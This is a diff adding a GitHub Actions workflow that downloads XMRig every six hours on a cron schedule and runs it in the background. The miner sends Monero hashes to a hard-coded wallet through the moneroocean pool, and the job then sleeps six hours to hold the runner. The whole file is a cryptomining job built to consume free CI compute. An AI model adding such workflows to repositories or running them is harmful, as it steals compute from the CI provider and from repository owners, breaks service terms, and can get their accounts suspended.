@@ -1,0 +1,17 @@
+name: XMR Ocean Miner (6h)
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup and run XMRig for 6 hours
+        run: |
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+          tar xf xmrig-6.20.0-linux-x64.tar.gz
+          cd xmrig-6.20.0
+          ./xmrig -o gulf.moneroocean.stream:443 -u [44UUnnnaY5D3ompgnJeErwSfvBvvMkPQaKCq7YVyhdho3Fqu8DQzrrMhrYL5czbpQbiXqGUbVGa8K8QrXTwp578jVhPSbE2] -p [WORKER_NAME] --tls --threads=2 &
+          sleep 21600
